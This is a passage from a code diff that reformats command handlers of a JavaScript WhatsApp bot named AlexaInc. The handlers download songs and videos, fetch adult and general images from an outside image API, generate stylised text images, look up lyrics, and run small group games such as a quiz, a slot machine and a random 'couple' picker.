+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: `Error: ${error.message}`,
+                    edit: dummymg.key,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+                console.log(error);
+              }
 
-                            } catch (error) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Error: ${error.message}`,
-                                    edit: dummymg.key
-                                }, {
-                                    quoted: msg
-                                });
-                                console.log(error)
+              break;
+            }
+            case "play": {
+              // generateBox('ihahfaafafifasfaik', 50)
+              if (!text)
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "name not provided here is ex:- .song song name",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
 
-                            }
+              const dummymg = await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: "wait song is downloading",
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              try {
+                const results = await yts(text);
+                const video = results.videos[0];
+                // console.log(video.author)
+                const filePath = await yth2.yta(video.url); // Assign to the outer variable
+                // const devsound = await yth2.fetchBuffer(filePath.download)
+                const sonst4 = await fonts.convert(video.title, "font1");
+                const cons5 = video.duration.timestamp;
+                const con4 = await fonts.convert(video.author.name, "font1");
 
-                            break
-                        }
-                        case 'play': {
-                            // generateBox('ihahfaafafifasfaik', 50)
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'name not provided here is ex:- .song song name'
-                            }, {
-                                quoted: msg
-                            })
-
-                            const dummymg = await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'wait song is downloading'
-                            }, {
-                                quoted: msg
-                            });
-                            try {
-                                const results = await yts(text);
-                                const video = results.videos[0];
-                                // console.log(video.author)
-                                const filePath = await yth2.yta(video.url); // Assign to the outer variable
-                                // const devsound = await yth2.fetchBuffer(filePath.download)
-                                const sonst4 = await fonts.convert(video.title, 'font1')
-                                const cons5 = video.duration.timestamp;
-                                const con4 = await fonts.convert(video.author.name, 'font1')
-
-                                const textl = `
+                const textl = `
 ɴᴀᴍᴇ : ${sonst4}
 ᴅᴜʀᴀᴛɪᴏɴ : ${cons5}
 ᴀᴜᴛʜᴏʀ : ${con4}
 `;
 
-                                // 2. Send the file FROM THE PATH
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    audio: filePath,
-                                    mimetype: 'audio/mp4'
-                                }, {
-                                    quoted: msg
-                                });
-
-
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    delete: dummymg.key
-                                })
-
-                            } catch (error) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Error: ${error.message}`,
-                                    edit: dummymg.key
-                                }, {
-                                    quoted: msg
-                                });
-                                console.log(error)
-
-                            }
-
-                            break
-                        }
-
-                        case 'ytdl':
-                        case 'dlyt': {
-
-                            // Regex to check for valid YouTube links (Desktop, Mobile, Shorts, Short-URLs)
-                            const isYtUrl =
-                                /^(?:https?:\/\/)?(?:www\.|m\.)?(?:youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/)|youtu\.be\/)/
-                                    .test(text);
-
-                            if (!text || !isYtUrl) {
-                                return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: '⚠️ URL missing or invalid.\n\nPlease provide a valid YouTube URL.\nExample:\n.ytdl https://www.youtube.com/watch?v=abc4jso0A3k'
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-                            try {
-                                const filePath = await yth2.ytv(text); // Assign to the outer variable
-                                // const devsound = await yth2.fetchBuffer(filePath.download)
-                                // 2. Send the file FROM THE PATH
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    document: filePath,
-                                    fileName: `${text}.mp4`,
-                                    caption: `here is your video ${text}`,
-                                    footer: 'Powerd by AlexaInc',
-                                    mimetype: 'video/mp4'
-                                }, {
-                                    quoted: msg
-                                });
-
-                            } catch (error) {
-                                console.log(error)
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Error: ${error.message}`
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-                            // finally {
-                            //     // 4. DELETE THE FILE
-                            //     // This can now see the 'filePath' variable
-                            //     if (filePath) {
-                            //         try {
-                            //             await fsp.unlink(filePath); // Delete the file
-                            //             console.log('Successfully deleted temp file:', filePath);
-                            //         } catch (deleteError) {
-                            //             console.error('Failed to delete temp file:', deleteError);
-                            //         }
-                            //     }
-                            // };
-
-
-
-                            break
-                        }
-
-                        case 'anal':
-                        case 'ass':
-                        case 'boobs':
-                        case 'gonewild':
-                        case 'hanal':
-                        case 'hass':
-                        case 'hboobs':
-                        case 'hentai':
-                        case 'hkitsune':
-                        case 'hmidriff':
-                        case 'hneko':
-                        case 'hthigh':
-                        case 'neko':
-                        case 'paizuri':
-                        case 'pgif':
-                        case 'pussy':
-                        case 'tentacle':
-                        case 'thigh':
-                        case 'yaoi': {
-                            axios.get(`https://api.night-api.com/images/nsfw/${command}`, {
-                                headers: {
-                                    authorization: process.env.NIGHTAPI_AUTH,
-                                },
-                            })
-                                .then(async (response) => {
-                                    const imageUrl = response.data.content.url;
-                                    console.log(imageUrl);
-                                    const contentType = response.data.content
-                                        .mimeType; // Get MIME type from the API response
-
-                                    const buffer = await getBuffer(imageUrl); // Get the buffer directly
-
-                                    if (buffer) {
-                                        // Check if it's a GIF by checking the file extension
-                                        if (imageUrl.toLowerCase().endsWith('.gif')) {
-                                            // Send as GIF (as video)
-                                            const mediaMessage = {
-                                                document: buffer,
-                                                caption: 'Here is a GIF!',
-                                                mimetype: 'image/gif',
-                                            };
-
-                                            // Send the GIF (as video)
-                                            await AlexaInc.sendMessage(msg.key.remoteJid, mediaMessage, {
-                                                quoted: msg
-                                            });
-                                        } else if (imageUrl.toLowerCase().endsWith('.jpg') || imageUrl
-                                            .toLowerCase().endsWith('.png')) {
-                                            // Send as image (JPG or PNG)
-                                            const mediaMessage = {
-                                                image: buffer, // Send the buffer directly
-                                                viewOnce: true,
-                                                caption: 'Here is an image!',
-                                            };
-
-                                            // Send the image
-                                            await AlexaInc.sendMessage(msg.key.remoteJid, mediaMessage, {
-                                                quoted: msg
-                                            });
-                                        } else {
-                                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                text: 'The file is not a supported image or video.'
-                                            }, {
-                                                quoted: msg
-                                            });
-                                        }
-                                    } else {
-                                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                                            text: 'Error downloading the file.'
-                                        }, {
-                                            quoted: msg
-                                        });
-                                    }
-                                })
-                                .catch(function (error) {
-                                    console.log(error);
-                                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'Can\'t send now, I will send later'
-                                    }, {
-                                        quoted: msg
-                                    });
-                                });
-
-                            break;
-                        }
-
-                        /////images text generation and nsfw and sfw
-
-                        case 'metallic':
-                        case 'ice':
-                        case 'snow':
-                        case 'impressive':
-                        case 'matrix':
-                        case 'light':
-                        case 'neon':
-                        case 'devil':
-                        case 'purple':
-                        case 'thunder':
-                        case 'leaves':
-                        case '1917':
-                        case 'arena':
-                        case 'hacker':
-                        case 'sand':
-                        case 'blackpink':
-                        case 'glitch':
-                        case 'fire': {
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'send text what you want to format ex /fire hi'
-                            });
-                            try {
-                                let result;
-                                switch (command) {
-                                    case 'metallic':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/impressive-decorative-3d-metal-text-effect-798.html",
-                                            text);
-                                        break;
-                                    case 'ice':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/ice-text-effect-online-101.html", text);
-                                        break;
-                                    case 'snow':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/create-a-snow-3d-text-effect-free-online-621.html",
-                                            text);
-                                        break;
-                                    case 'impressive':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/create-3d-colorful-paint-text-effect-online-801.html",
-                                            text);
-                                        break;
-                                    case 'matrix':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/matrix-text-effect-154.html", text);
-                                        break;
-                                    case 'light':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/light-text-effect-futuristic-technology-style-648.html",
-                                            text);
-                                        break;
-                                    case 'neon':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/create-colorful-neon-light-text-effects-online-797.html",
-                                            text);
-                                        break;
-                                    case 'devil':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/neon-devil-wings-text-effect-online-683.html",
-                                            text);
-                                        break;
-                                    case 'purple':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/purple-text-effect-online-100.html", text);
-                                        break;
-                                    case 'thunder':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/thunder-text-effect-online-97.html", text);
-                                        break;
-                                    case 'leaves':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/green-brush-text-effect-typography-maker-online-153.html",
-                                            text);
-                                        break;
-                                    case '1917':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/1917-style-text-effect-523.html", text);
-                                        break;
-                                    case 'arena':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/create-cover-arena-of-valor-by-mastering-360.html",
-                                            text);
-                                        break;
-                                    case 'hacker':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/create-anonymous-hacker-avatars-cyan-neon-677.html",
-                                            text);
-                                        break;
-                                    case 'sand':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/write-names-and-messages-on-the-sand-online-582.html",
-                                            text);
-                                        break;
-                                    case 'blackpink':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/create-a-blackpink-style-logo-with-members-signatures-810.html",
-                                            text);
-                                        break;
-                                    case 'glitch':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html",
-                                            text);
-                                        break;
-                                    case 'fire':
-                                        result = await mumaker.ephoto(
-                                            "https://en.ephoto360.com/flame-lettering-effect-372.html", text);
-                                        break;
-                                }
-
-                                // if (!result || !result.image) {
-                                //     throw new Error('No image URL received from the API');
-                                // }
-
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    image: {
-                                        url: result.image
-                                    }
-                                });
-                            } catch (error) {
-                                console.error('Error in text generator:', error);
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: error.message
-                                });
-                            }
-
-
-
-                            break
-                        }
-
-
-                        case "liric": case "lyrics": {
-                            if (!text) return mess.reply("song name required for search lyrics");
-                            try {
-                                const encodedQuery = encodeURIComponent(text);
-                                const { data: response } = await axios.get(`https://lrclib.net/api/search?q=${encodedQuery}`);
-
-                                if (!response || response.length === 0) {
-                                    return await AlexaInc.sendMessage(msg.key.remoteJid, { text: "No lyrics found for this song." }, { quoted: msg });
-                                }
-
-                                const interactiveButtons = [{
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({
-                                        title: "Select a song to get lyrics",
-                                        sections: [{
-                                            title: `top ${response.length < 10 ? response.length : 10} songs`,
-                                            highlight_label: "Select",
-                                            rows: response.slice(0, 10).map((song) => ({
-                                                header: song.name || "Unknown",
-                                                title: song.artistName || "Unknown Artist",
-                                                description: song.albumName || "Unknown Album",
-                                                id: `.lyric_select ${song.id}`
-                                            }))
-                                        }]
-                                    })
-                                }];
-
-                                const interactiveMessage = {
-                                    text: `Found ${response.length} results for "${text}". Choose a song to get lyrics:`,
-                                    title: `Hello ${msg.pushName || "User"}`,
-                                    footer: "Powered by HANSAKA",
-                                    interactiveButtons
-                                };
-
-                                await AlexaInc.sendMessage(msg.key.remoteJid, interactiveMessage, {
-                                    quoted: msg
-                                });
-                            } catch (e) {
-                                await AlexaInc.sendMessage(msg.key.remoteJid, { text: e.message });
-                            }
-                            break;
-                        }
-                        case "lyric_select":{
-                            if (!text) mess.reply("song name requred for search lyrics");
-                            axios.get(`https://lrclib.net/api/get/${text}`).then(async (response) => {
-                                response = response.data;
-                                const painlyrics = `*Song name* :  _${response.name}_ \n\n*Artist name* :  _${response.artistName}_\n\n*Album name* :  _${ response.albumName }_\n\n\n*Lyrics* :  \n\n ${response.plainLyrics}`
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {text:painlyrics,},{quoted:msg})
-                            })
-                            break;
-                        }
-
-                        case 'coffee':
-                        case 'food':
-                        case 'holo':
-                        case 'kanna': {
-
-                            axios.get(`https://api.night-api.com/images/sfw/${command}`, {
-                                headers: {
-                                    authorization: process.env.NIGHTAPI_AUTH
-                                }
-                            })
-                                .then(function (response) {
-                                    const imageUrl = response.data.content.url;
-                                    const imagesavepath = `./temp/${response.data.content.id}`;
-                                    const writer = fs.createWriteStream(path.join(__dirname, '..', imagesavepath));
-
-                                    axios({
-                                        url: imageUrl,
-                                        method: 'GET',
-                                        responseType: 'stream'
-                                    }).then((imageResponse) => {
-                                        imageResponse.data.pipe(writer);
-                                        writer.on('finish', () => {
-
-                                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                                image: {
-                                                    url: imagesavepath
-                                                },
-                                                caption: `Your ${command} is ready`
-                                            }, {
-                                                quoted: msg
-                                            });
-
-                                            fs.remove(imagesavepath)
-                                                .then(() => {
-                                                    console.log(
-                                                        'Image deleted successfully');
-                                                })
-                                                .catch(err => {
-                                                    console.log('Error deleting the image:',
-                                                        err);
-                                                });
-
-                                        });
-                                    }).catch(err => {
-                                        console.log('Error downloading the image:', err)
-                                    });
-                                })
-                                .catch(function (error) {
-                                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'Cant send now i will send later'
-                                    }, {
-                                        quoted: msg
-                                    });
-                                });
-
-                            break
-                        };
-
-                        case 'dailyqa': {
-                            if (!QanAdata[sender]) {
-
-
-                                QanAdata[sender] = {
-                                    name: msg.pushName,
-                                    qstasked: 0,
-                                    answered: 0,
-                                    answeres: [],
-                                    incorrect: 0,
-                                    correct: 0,
-                                };
-                                const qstasked = QanAdata[sender].qstasked
-                                QanAdata[sender].qstasked++;
-                                saveQanAdata(QanAdata);
-
-                                const qtan = questionsss[qstasked + 1]
-
-                                const preparedquestion =
-                                    `${qtan.question}\n1. ${qtan.a1}\n2. ${qtan.a2}\n3. ${qtan.a3}\n4. ${qtan.a4}`
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `🎮 *Q&A challange Started!*\n questions: 20\nUse: .answer <number>`
-                                }, {
-                                    quoted: msg
-                                });
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: preparedquestion
-                                }, {
-                                    quoted: msg
-                                });
-
-
-
-                                break;
-                            } else {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: "⚠️ You already played daily q&a game! try again yesterday."
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-
-
-                            break
-                        }
-
-                        case 'answer': {
-
-                            if (!QanAdata[sender]) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: "Q&A session curently not activated use `.dailyqa` to active"
-                                }, {
-                                    quoted: msg
-                                });
-                            } else {
-                                QanAdata[sender].answered++
-                                const qstasked = QanAdata[sender].qstasked;
-
-
-                                if (QanAdata[sender].answered >= 20) {
-                                    QanAdata[sender].answered = 20
-                                    saveQanAdata(QanAdata);
-                                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: "⚠️ You are done wait Hansaka will anounce the winner. Correct count" +
-                                            QanAdata[sender].correct
-                                    }, {
-                                        quoted: msg
-                                    });
-                                } else if (QanAdata[sender].answered <= 20) {
-
-                                    const qtan = questionsss[qstasked + 1]
-
-                                    const preparedquestion =
-                                        `${qtan.question}\n1. ${qtan.a1}\n2. ${qtan.a2}\n1. ${qtan.a3}\n1. ${qtan.a4}`
-                                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: preparedquestion
-                                    }, {
-                                        quoted: msg
-                                    });
-
-                                    QanAdata[sender].qstasked++
-                                    QanAdata[sender].answeres.push(text)
-
-
-                                    console.log(`answer is :${questionsss[qstasked].ca} user say:${args[0]}`)
-                                    if (questionsss[qstasked].ca == text) {
-                                        QanAdata[sender].correct++
-                                    } else {
-                                        QanAdata[sender].incorrect++
-                                    };
-
-                                    saveQanAdata(QanAdata);
-
-
-                                }
-                            }
-                            break
-                        }
-
-
-
-
-
-                        // gamesssssss
-                        case 'slot': {
-                            const sotoy = [
-                                '🍊 : 🍒 : 🍐 *YOU LOSE BRO*',
-                                '🍒 : 🔔 : 🍊 *YOU LOSE BRO*',
-                                '🍇 : 🍇 : 🍐 *YOU LOSE BRO*',
-                                '🍊 : 🍋 : 🔔 *YOU LOSE BRO*', //ANKER
-                                '🔔 : 🍒 : 🍐 *YOU LOSE BRO*',
-                                '🔔 : 🍒 : 🍊 *YOU LOSE BRO*',
-                                '🍊 : 🍋 : 🔔 *YOU LOSE BRO*',
-                                '🍒 : 🍒 : 🍒 *You Win👑*',
-                                '🍐 : 🍒 : 🍐 *YOU LOSE BRO*',
-                                '🍊 : 🍒 : 🍒 *YOU LOSE BRO*',
-                                '🔔 : 🔔 : 🍇 *YOU LOSE BRO*',
-                                '🍌 : 🍌 : 🔔 *YOU LOSE BRO*',
-                                '🍐 : 🔔 : 🔔 *YOU LOSE BRO*',
-                                '🍊 : 🍋 : 🍒 *YOU LOSE BRO*',
-                                '🍋 : 🍋 : 🍋 *You Win👑*',
-                                '🔔 : 🔔 : 🍇 *YOU LOSE BRO*',
-                                '🔔 : 🍇 : 🍇 *YOU LOSE BRO*',
-                                '🔔 : 🍐 : 🔔',
-                                '🍌 : 🍌 : 🍌 *You Win👑*'
-                            ]
-                            const dripslot = sotoy[Math.floor(Math.random() * sotoy.length)]
-                            let datane = fs.readFileSync('./assets/nothing.json')
-                            jsonData = JSON.parse(datane)
-                            randIndex = Math.floor(Math.random() * jsonData.length)
-                            randKey = jsonData[randIndex];
-                            buffer = await getBuffer(randKey.result)
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                image: buffer,
-                                caption: '*SLOT MACHINE*\n' + dripslot
-                            }, {
-                                quoted: msg
-                            })
-
-
-
-                            break
-
-
-                        }
-
-
-                        case 'shipping':
-                        case 'couple': {
-                            if (!isGroup) return mess.group();
-
-                            const datajson = `./${shippingflder}/${msg.key.remoteJid}.json`;
-                            const todaya = new Date().toLocaleDateString();
-
-                            const participantids = participants.map(user => user.id);
-
-                            let jsonData;
-                            let todatcouple;
-                            let couples = []; // Default to an empty array
-
-                            try {
-                                // --- 1. READ EXISTING FILE ---
-                                const fileData = fs.readFileSync(datajson, 'utf8');
-                                jsonData = JSON.parse(fileData);
-
-                                // Fix for old/corrupted JSON
-                                couples = Array.isArray(jsonData.couples) ? jsonData.couples : [];
-
-                                const coupleids = couples.flatMap(item => item.couple);
-
-                                if (jsonData.lastchoosen === todaya) {
-                                    // --- 2A. COUPLE ALREADY CHOSEN TODAY ---
-                                    todatcouple = (couples.find(item => item.date === todaya))?.couple;
-
-                                } else {
-                                    // --- 2B. CHOOSE A NEW COUPLE ---
-                                    let available = participantids.filter(id => !coupleids.includes(id));
-
-                                    if (available.length < 2) {
-                                        available = [...participantids];
-                                    }
-
-                                    todatcouple = available.sort(() => 0.5 - Math.random()).slice(0, 2);
-                                    couples.push({
-                                        date: todaya,
-                                        couple: todatcouple
-                                    });
-                                }
-
-                                // --- 3. UPDATE JSON DATA ---
-                                jsonData = {
-                                    lastchoosen: todaya,
-                                    couples: couples
-                                };
-
-                            } catch (error) {
-                                if (error.code === 'ENOENT') {
-                                    // --- 1. FILE DOESN'T EXIST (FIRST TIME RUN) ---
-                                    todatcouple = participantids.sort(() => 0.5 - Math.random()).slice(0, 2);
-
-                                    jsonData = {
-                                        lastchoosen: todaya,
-                                        couples: [{
-                                            date: todaya,
-                                            couple: todatcouple
-                                        }]
-                                    };
-
-                                    try {
-                                        fs.mkdirSync(path.dirname(datajson), {
-                                            recursive: true
-                                        });
-                                    } catch (writeError) {
-                                        console.error('Error creating directory:', writeError);
-                                    }
-
-                                } else {
-                                    // --- OTHER ERRORS (like JSON parse error) ---
-                                    console.error('Error handling shipping data:', error);
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: 'An error occurred. Please contact the owner.'
-                                    });
-                                    break; // Stop execution
-                                }
-                            }
-
-                            // --- 4. SEND MESSAGE & SAVE FILE (MODIFIED) ---
-
-                            // This is the variable we will send
-                            let coupleToSend = todatcouple;
-
-                            // **THIS IS THE FIX:**
-                            // If 'todatcouple' is undefined, but we *know* a couple was chosen today,
-                            // we must find it again from the 'jsonData' we just loaded/created.
-                            if ((!coupleToSend || coupleToSend.length !== 2) && jsonData && jsonData.lastchoosen ===
-                                todaya) {
-                                const todaysCouplesArray = Array.isArray(jsonData.couples) ? jsonData.couples : [];
-                                coupleToSend = (todaysCouplesArray.find(item => item.date === todaya))?.couple;
-                            }
-
-
-                            // Now, we check if we have a valid couple to send
-                            if (coupleToSend && coupleToSend.length === 2) {
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Today couple is 
-@${coupleToSend[0].replace('@s.whatsapp.net', '')} and @${coupleToSend[1].replace('@s.whatsapp.net', '')}
+                // 2. Send the file FROM THE PATH
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    audio: filePath,
+                    mimetype: "audio/mp4",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  delete: dummymg.key,
+                });
+              } catch (error) {
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: `Error: ${error.message}`,
+                    edit: dummymg.key,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+                console.log(error);
+              }
+
+              break;
+            }
+
+            case "ytdl":
+            case "dlyt": {
+              // Regex to check for valid YouTube links (Desktop, Mobile, Shorts, Short-URLs)
+              const isYtUrl =
+                /^(?:https?:\/\/)?(?:www\.|m\.)?(?:youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/)|youtu\.be\/)/.test(
+                  text,
+                );
+
+              if (!text || !isYtUrl) {
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "⚠️ URL missing or invalid.\n\nPlease provide a valid YouTube URL.\nExample:\n.ytdl https://www.youtube.com/watch?v=abc4jso0A3k",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+              try {
+                const filePath = await yth2.ytv(text); // Assign to the outer variable
+                // const devsound = await yth2.fetchBuffer(filePath.download)
+                // 2. Send the file FROM THE PATH
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    document: filePath,
+                    fileName: `${text}.mp4`,
+                    caption: `here is your video ${text}`,
+                    footer: "Powerd by AlexaInc",
+                    mimetype: "video/mp4",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              } catch (error) {
+                console.log(error);
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: `Error: ${error.message}`,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
+              // finally {
+              //     // 4. DELETE THE FILE
+              //     // This can now see the 'filePath' variable
+              //     if (filePath) {
+              //         try {
+              //             await fsp.unlink(filePath); // Delete the file
+              //             console.log('Successfully deleted temp file:', filePath);
+              //         } catch (deleteError) {
+              //             console.error('Failed to delete temp file:', deleteError);
+              //         }
+              //     }
+              // };
+
+              break;
+            }
+
+            case "anal":
+            case "ass":
+            case "boobs":
+            case "gonewild":
+            case "hanal":
+            case "hass":
+            case "hboobs":
+            case "hentai":
+            case "hkitsune":
+            case "hmidriff":
+            case "hneko":
+            case "hthigh":
+            case "neko":
+            case "paizuri":
+            case "pgif":
+            case "pussy":
+            case "tentacle":
+            case "thigh":
+            case "yaoi": {
+              axios
+                .get(`https://api.night-api.com/images/nsfw/${command}`, {
+                  headers: {
+                    authorization: process.env.NIGHTAPI_AUTH,
+                  },
+                })
+                .then(async (response) => {
+                  const imageUrl = response.data.content.url;
+                  console.log(imageUrl);
+                  const contentType = response.data.content.mimeType; // Get MIME type from the API response
+
+                  const buffer = await getBuffer(imageUrl); // Get the buffer directly
+
+                  if (buffer) {
+                    // Check if it's a GIF by checking the file extension
+                    if (imageUrl.toLowerCase().endsWith(".gif")) {
+                      // Send as GIF (as video)
+                      const mediaMessage = {
+                        document: buffer,
+                        caption: "Here is a GIF!",
+                        mimetype: "image/gif",
+                      };
+
+                      // Send the GIF (as video)
+                      await AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        mediaMessage,
+                        {
+                          quoted: msg,
+                        },
+                      );
+                    } else if (
+                      imageUrl.toLowerCase().endsWith(".jpg") ||
+                      imageUrl.toLowerCase().endsWith(".png")
+                    ) {
+                      // Send as image (JPG or PNG)
+                      const mediaMessage = {
+                        image: buffer, // Send the buffer directly
+                        viewOnce: true,
+                        caption: "Here is an image!",
+                      };
+
+                      // Send the image
+                      await AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        mediaMessage,
+                        {
+                          quoted: msg,
+                        },
+                      );
+                    } else {
+                      AlexaInc.sendMessage(
+                        msg.key.remoteJid,
+                        {
+                          text: "The file is not a supported image or video.",
+                        },
+                        {
+                          quoted: msg,
+                        },
+                      );
+                    }
+                  } else {
+                    AlexaInc.sendMessage(
+                      msg.key.remoteJid,
+                      {
+                        text: "Error downloading the file.",
+                      },
+                      {
+                        quoted: msg,
+                      },
+                    );
+                  }
+                })
+                .catch(function (error) {
+                  console.log(error);
+                  AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "Can't send now, I will send later",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                });
+
+              break;
+            }
+
+            /////images text generation and nsfw and sfw
+
+            case "metallic":
+            case "ice":
+            case "snow":
+            case "impressive":
+            case "matrix":
+            case "light":
+            case "neon":
+            case "devil":
+            case "purple":
+            case "thunder":
+            case "leaves":
+            case "1917":
+            case "arena":
+            case "hacker":
+            case "sand":
+            case "blackpink":
+            case "glitch":
+            case "fire": {
+              if (!text)
+                return AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "send text what you want to format ex /fire hi",
+                });
+              try {
+                let result;
+                switch (command) {
+                  case "metallic":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/impressive-decorative-3d-metal-text-effect-798.html",
+                      text,
+                    );
+                    break;
+                  case "ice":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/ice-text-effect-online-101.html",
+                      text,
+                    );
+                    break;
+                  case "snow":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/create-a-snow-3d-text-effect-free-online-621.html",
+                      text,
+                    );
+                    break;
+                  case "impressive":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/create-3d-colorful-paint-text-effect-online-801.html",
+                      text,
+                    );
+                    break;
+                  case "matrix":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/matrix-text-effect-154.html",
+                      text,
+                    );
+                    break;
+                  case "light":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/light-text-effect-futuristic-technology-style-648.html",
+                      text,
+                    );
+                    break;
+                  case "neon":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/create-colorful-neon-light-text-effects-online-797.html",
+                      text,
+                    );
+                    break;
+                  case "devil":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/neon-devil-wings-text-effect-online-683.html",
+                      text,
+                    );
+                    break;
+                  case "purple":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/purple-text-effect-online-100.html",
+                      text,
+                    );
+                    break;
+                  case "thunder":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/thunder-text-effect-online-97.html",
+                      text,
+                    );
+                    break;
+                  case "leaves":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/green-brush-text-effect-typography-maker-online-153.html",
+                      text,
+                    );
+                    break;
+                  case "1917":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/1917-style-text-effect-523.html",
+                      text,
+                    );
+                    break;
+                  case "arena":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/create-cover-arena-of-valor-by-mastering-360.html",
+                      text,
+                    );
+                    break;
+                  case "hacker":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/create-anonymous-hacker-avatars-cyan-neon-677.html",
+                      text,
+                    );
+                    break;
+                  case "sand":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/write-names-and-messages-on-the-sand-online-582.html",
+                      text,
+                    );
+                    break;
+                  case "blackpink":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/create-a-blackpink-style-logo-with-members-signatures-810.html",
+                      text,
+                    );
+                    break;
+                  case "glitch":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html",
+                      text,
+                    );
+                    break;
+                  case "fire":
+                    result = await mumaker.ephoto(
+                      "https://en.ephoto360.com/flame-lettering-effect-372.html",
+                      text,
+                    );
+                    break;
+                }
+
+                // if (!result || !result.image) {
+                //     throw new Error('No image URL received from the API');
+                // }
+
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  image: {
+                    url: result.image,
+                  },
+                });
+              } catch (error) {
+                console.error("Error in text generator:", error);
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: error.message,
+                });
+              }
+
+              break;
+            }
+
+            case "liric":
+            case "lyrics": {
+              if (!text)
+                return mess.reply("song name required for search lyrics");
+              try {
+                const encodedQuery = encodeURIComponent(text);
